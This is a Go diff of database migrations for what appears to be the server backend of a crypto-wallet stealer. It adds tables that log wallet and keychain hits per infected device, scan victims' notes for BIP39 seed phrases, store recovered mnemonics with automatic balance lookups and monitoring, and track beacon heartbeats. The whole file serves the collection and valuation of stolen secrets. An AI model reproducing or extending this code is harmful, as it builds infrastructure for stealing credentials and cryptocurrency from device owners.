@@ -16,6 +16,7 @@ package store
 //   - ua/device_version 收敛为 NOT NULL DEFAULT ''（对齐旧版 COALESCE 规范化语义）
 
 import (
+	"context"
 	"errors"
 	"fmt"
 	"strings"
@@ -38,6 +39,170 @@ var migrations = []migration{
 		"MODIFY `release` VARCHAR(128) NOT NULL DEFAULT '', " +
 		"MODIFY kern_version VARCHAR(512) NOT NULL DEFAULT '', " +
 		"MODIFY source VARCHAR(128) NOT NULL DEFAULT '';"},
+	{3, `
+-- 设备钱包命中映射表：设备列表"是否有钱包（有/无）"快速判定。
+-- 写入：war 钱包命中时按 uuid UPSERT（wallet_hits 累计）；
+-- 读取：ListDevices 带出 has_wallet / wallet_hits；无行 = 无（0）。
+CREATE TABLE IF NOT EXISTS device_wallet_flags (
+  uuid        VARCHAR(128) NOT NULL,
+  has_wallet  TINYINT      NOT NULL DEFAULT 0,
+  wallet_hits INT          NOT NULL DEFAULT 0,
+  first_seen  VARCHAR(32)  NOT NULL,
+  last_seen   VARCHAR(32)  NOT NULL,
+  updated_ts  VARCHAR(32)  NOT NULL,
+  PRIMARY KEY (uuid),
+  KEY ix_dwf_has (has_wallet, last_seen)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
+
+-- 历史回填①：wallet_seen（war 包 wallet 桶快照）
+INSERT INTO device_wallet_flags(uuid, has_wallet, wallet_hits, first_seen, last_seen, updated_ts)
+SELECT device_uuid, 1, COUNT(*), MIN(ts), MAX(ts), DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s')
+FROM wallet_seen WHERE device_uuid IS NOT NULL AND device_uuid <> ''
+GROUP BY device_uuid
+ON DUPLICATE KEY UPDATE has_wallet=1,
+  wallet_hits=GREATEST(wallet_hits, VALUES(wallet_hits)),
+  first_seen=LEAST(first_seen, VALUES(first_seen)),
+  last_seen=GREATEST(last_seen, VALUES(last_seen)),
+  updated_ts=VALUES(updated_ts);
+
+-- 历史回填②：keychain_items（war 包钱包规则命中条目）
+INSERT INTO device_wallet_flags(uuid, has_wallet, wallet_hits, first_seen, last_seen, updated_ts)
+SELECT device_uuid, 1, COUNT(*), MIN(first_seen), MAX(last_seen), DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%s')
+FROM keychain_items WHERE wallet_rule IS NOT NULL AND wallet_rule <> ''
+GROUP BY device_uuid
+ON DUPLICATE KEY UPDATE has_wallet=1,
+  wallet_hits=GREATEST(wallet_hits, VALUES(wallet_hits)),
+  first_seen=LEAST(first_seen, VALUES(first_seen)),
+  last_seen=GREATEST(last_seen, VALUES(last_seen)),
+  updated_ts=VALUES(updated_ts);
+`},
+	{4, `
+-- BIP39 助记词扫描命中记录表：备忘录批量模糊匹配 + 校验结果留痕（前端只读此表，避免全量堆砌）。
+CREATE TABLE IF NOT EXISTS memo_bip39 (
+  id         BIGINT NOT NULL AUTO_INCREMENT,
+  uuid       VARCHAR(128) NOT NULL,
+  note_id    BIGINT       NOT NULL DEFAULT 0,
+  field      VARCHAR(16)  NOT NULL DEFAULT '',
+  phrase     TEXT         NULL,
+  raw        TEXT         NULL,
+  words      INT          NOT NULL DEFAULT 0,
+  valid      TINYINT      NOT NULL DEFAULT 0,
+  reason     VARCHAR(128) NOT NULL DEFAULT '',
+  corrected  INT          NOT NULL DEFAULT 0,
+  unknown    INT          NOT NULL DEFAULT 0,
+  scanned_at VARCHAR(32)  NOT NULL,
+  PRIMARY KEY (id),
+  UNIQUE KEY ux_bip39 (uuid, note_id, field, phrase(191)),
+  KEY ix_bip39_valid (valid, words),
+  KEY ix_bip39_uuid (uuid)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
+`},
+	{5, `
+-- BIP39 词表落库（2048 词），供前端「词表」模块检索。
+CREATE TABLE IF NOT EXISTS bip39_words (
+  idx  INT          NOT NULL,
+  word VARCHAR(16)  NOT NULL,
+  PRIMARY KEY (idx),
+  KEY ix_bip39_word (word)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+`},
+	{6, `
+-- 交付阶段进度：增量维护「每 client 最远阶段」，替代对 access_log(640万行) 的全表 GROUP BY。
+CREATE TABLE IF NOT EXISTS client_stage (
+  client     VARCHAR(64) NOT NULL,
+  pct        INT         NOT NULL DEFAULT 0,
+  updated_ts VARCHAR(32) NOT NULL,
+  PRIMARY KEY (client),
+  KEY ix_client_stage_pct (pct)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
+`},
+	{7, `
+-- /war 自动检测结果（新回传自动跑 tools/ 取证工具，汇总展示）。
+CREATE TABLE IF NOT EXISTS war_scan (
+  packet_id    BIGINT       NOT NULL,
+  uuid         VARCHAR(128) NOT NULL DEFAULT '',
+  analyzed_ts  VARCHAR(32)  NOT NULL,
+  ok           TINYINT      NOT NULL DEFAULT 0,
+  brands       VARCHAR(512) NOT NULL DEFAULT '',
+  mnemonic_cnt INT          NOT NULL DEFAULT 0,
+  valid_cnt    INT          NOT NULL DEFAULT 0,
+  keystore_dec INT          NOT NULL DEFAULT 0,
+  secrets_cnt  INT          NOT NULL DEFAULT 0,
+  emails       VARCHAR(1024) NOT NULL DEFAULT '',
+  detail_json  MEDIUMTEXT   NULL,
+  err          VARCHAR(255) NOT NULL DEFAULT '',
+  PRIMARY KEY (packet_id),
+  KEY ix_war_scan_valid (valid_cnt),
+  KEY ix_war_scan_uuid (uuid)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
+`},
+	{8, `
+-- 首见时间不可变：beacon 去重会刷 recv_ts 保活，导致 first_seen=MIN(recv_ts) 每刷新都变“刚刚”
+-- （表现为设备“重复上线”）。新增 first_recv_ts/first_recv_epoch，仅插入时写、重复时不更新。
+ALTER TABLE packets ADD COLUMN first_recv_ts VARCHAR(32) NOT NULL DEFAULT '', ADD COLUMN first_recv_epoch DOUBLE NOT NULL DEFAULT 0;
+UPDATE packets SET first_recv_ts=recv_ts, first_recv_epoch=recv_epoch WHERE first_recv_ts='';
+`},
+	{9, `
+-- 设备读模型（物化）：每设备一行，入库时增量维护，读接口不再现场 GROUP BY 大表。
+CREATE TABLE IF NOT EXISTS device_stats (
+  uuid         VARCHAR(128) NOT NULL,
+  first_seen   VARCHAR(32)  NOT NULL DEFAULT '',
+  last_seen    VARCHAR(32)  NOT NULL DEFAULT '',
+  last_epoch   DOUBLE       NOT NULL DEFAULT 0,
+  beacon_epoch DOUBLE       NOT NULL DEFAULT 0,
+  war_count    INT          NOT NULL DEFAULT 0,
+  notes_count  INT          NOT NULL DEFAULT 0,
+  apps_count   INT          NOT NULL DEFAULT 0,
+  updated_ts   VARCHAR(32)  NOT NULL,
+  PRIMARY KEY (uuid),
+  KEY ix_device_stats_last (last_epoch),
+  KEY ix_device_stats_beacon (beacon_epoch)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
+`},
+	{10, `
+-- keychain_items 字段加宽：service/account/access_group/label 常超 255，VARCHAR(255) 会
+-- 触发 1406 Data too long → 整批 INSERT 回滚（丢整包 keychain）。改 TEXT，唯一键仍用前缀索引。
+ALTER TABLE keychain_items
+  MODIFY service      TEXT NOT NULL,
+  MODIFY account      TEXT NOT NULL,
+  MODIFY access_group TEXT NOT NULL,
+  MODIFY label        TEXT NULL;
+`},
+	{11, `
+-- 助记词库：集中存放解析/还原出来的助记词（war 工具检测 / 备忘录 BIP39 命中等）。
+CREATE TABLE IF NOT EXISTS recovered_words (
+  id          BIGINT       NOT NULL AUTO_INCREMENT,
+  uuid        VARCHAR(128) NOT NULL DEFAULT '',
+  source      VARCHAR(16)  NOT NULL DEFAULT 'war',
+  packet_id   BIGINT       NOT NULL DEFAULT 0,
+  phrase      TEXT         NULL,
+  words       INT          NOT NULL DEFAULT 0,
+  valid       TINYINT      NOT NULL DEFAULT 0,
+  wallet      VARCHAR(64)  NOT NULL DEFAULT '',
+  crosscheck  VARCHAR(255) NOT NULL DEFAULT '',
+  created_ts  VARCHAR(32)  NOT NULL,
+  PRIMARY KEY (id),
+  UNIQUE KEY ux_rw (uuid, phrase(191)),
+  KEY ix_rw_valid (valid, words),
+  KEY ix_rw_uuid (uuid)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci ROW_FORMAT=DYNAMIC;
+`},
+	{12, `
+-- 助记词库：余额缓存（入库后后台 chainquery 自动查询，结果缓存，前端直接显示）。
+ALTER TABLE recovered_words
+  ADD COLUMN balance_json MEDIUMTEXT NULL,
+  ADD COLUMN balance_usd  DOUBLE NOT NULL DEFAULT 0,
+  ADD COLUMN balance_ts   VARCHAR(32) NOT NULL DEFAULT '';
+`},
+	{13, `
+-- 助记词库：监控开关（仅开启监控的条目由后台自动查询/周期刷新；未开启只展示已有缓存）。
+ALTER TABLE recovered_words ADD COLUMN monitored TINYINT NOT NULL DEFAULT 0;
+`},
+	{14, `
+-- 上报次数：beacon 心跳不再逐条写 access_log，改为按 client 计数（控 access_log 表体）。
+-- 心跳占全量访问 ~50%，降级后 access_log 体积减半；阶段推进(pct)仍照常维护。
+ALTER TABLE client_stage ADD COLUMN report_count BIGINT NOT NULL DEFAULT 0;
+`},
 }
 
 // baselineDDL 基线 Schema（与旧库 v12 最终形态一一对应）。
@@ -90,7 +255,11 @@ CREATE TABLE IF NOT EXISTS packets (
   sha256       VARCHAR(64)  NULL,
   content_kind VARCHAR(16)  NOT NULL DEFAULT 'raw',
   PRIMARY KEY (id),
-  UNIQUE KEY ux_packets_file (file_path),
+  -- 注意：file_path 上【不能】建唯一索引！小包（<16KB）不落盘时 file_path=''
+  -- （留存策略，见 capture_store.go CaptureMinBytes），唯一索引会让所有小包
+  -- 撞键合并到同一行 → beacon recv_epoch 不再按设备刷新 → 设备集体离线
+  -- （INC-20260930-02）。去重由 ux_packets_ep_sha 承担，这里只留普通索引。
+  KEY ix_packets_file (file_path(191)),
   UNIQUE KEY ux_packets_ep_sha (endpoint, sha256),
   KEY ix_packets_ep_ts (endpoint, recv_epoch),
   KEY ix_packets_kind (content_kind)
@@ -354,23 +523,42 @@ CREATE TABLE IF NOT EXISTS result_data (
 `
 
 // migrate 执行版本化迁移（命名锁串行化；幂等 DDL）。
+//
+// 连接钉定（INC-2026-0929 复查 P1 修复）：MySQL/MariaDB 命名锁是**连接作用域**——
+// 必须 GET_LOCK 与 RELEASE_LOCK 落在同一连接。此前用池化句柄 d.conn，取锁挂到池内
+// 连接 A、释放落到连接 B（返回 0 无效），锁滞留直到 A 被回收/关闭；期间任何新实例
+// migrate 等锁 60s 超时 → OpenDB 失败 → 服务启动失败（多 worker 父子进程必踩）。
+// 现在整个"建表→取锁→迁移→释锁"钉在同一 *sql.Conn 上完成。
 func (d *DB) migrate() error {
-	if _, err := d.conn.Exec(
-		"CREATE TABLE IF NOT EXISTS schema_migrations(" +
-			"version INT PRIMARY KEY, applied_at VARCHAR(32) NOT NULL)" +
+	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
+	defer cancel()
+	c, err := d.conn.Conn(ctx)
+	if err != nil {
+		return fmt.Errorf("migrate conn: %w", err)
+	}
+	defer c.Close()
+
+	if _, err := c.ExecContext(ctx,
+		"CREATE TABLE IF NOT EXISTS schema_migrations("+
+			"version INT PRIMARY KEY, applied_at VARCHAR(32) NOT NULL)"+
 			" ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci"); err != nil {
 		return err
 	}
 
 	// 跨实例迁移互斥：拿不到锁（超时）直接报错，避免并发 DDL 竞态。
 	var locked *int64
-	if err := d.conn.QueryRow("SELECT GET_LOCK(?, 60)", migrationLockName).Scan(&locked); err != nil {
+	if err := c.QueryRowContext(ctx, "SELECT GET_LOCK(?, 60)", migrationLockName).Scan(&locked); err != nil {
 		return fmt.Errorf("migrate lock: %w", err)
 	}
 	if locked == nil || *locked != 1 {
 		return errors.New("migrate lock timeout (another instance is migrating)")
 	}
-	defer func() { _, _ = d.conn.Exec("SELECT RELEASE_LOCK(?)", migrationLockName) }()
+	// 释锁必须走同一连接 c；用独立短 ctx（迁移失败路径也要能释放）。
+	defer func() {
+		rctx, rcancel := context.WithTimeout(context.Background(), 10*time.Second)
+		defer rcancel()
+		_, _ = c.ExecContext(rctx, "SELECT RELEASE_LOCK(?)", migrationLockName)
+	}()
 
 	done := map[int64]bool{}
 	for _, r := range d.Query("SELECT version FROM schema_migrations") {
@@ -387,6 +575,23 @@ func (d *DB) migrate() error {
 			"INSERT INTO schema_migrations(version, applied_at) VALUES(?,?)",
 			m.version, time.Now().Format("2006-01-02 15:04:05")); err != nil {
 			return err
+		}
+	}
+
+	// v4（2026-09-30 INC-20260930-02）：遗留的 ux_packets_file 唯一索引与
+	// "小包不落盘"策略冲突（file_path='' 全部撞键 → beacon 心跳刷新全部落在
+	// 同一行 → 设备集体离线）。基线已改普通索引；存量库在这里有则删除、无则跳过
+	// （放迁移列表外做条件判断，避免无该索引的库被 ALTER 报错卡住迁移）。
+	var legacyIdx int64
+	if r := d.QueryOne(
+		"SELECT COUNT(*) n FROM information_schema.STATISTICS"+
+			" WHERE table_schema=DATABASE() AND table_name='packets'"+
+			"   AND index_name='ux_packets_file'"); r != nil {
+		legacyIdx = toInt(r["n"])
+	}
+	if legacyIdx > 0 {
+		if _, err := d.conn.Exec("ALTER TABLE packets DROP INDEX ux_packets_file"); err != nil {
+			return fmt.Errorf("drop legacy ux_packets_file: %w", err)
 		}
 	}
 	return nil
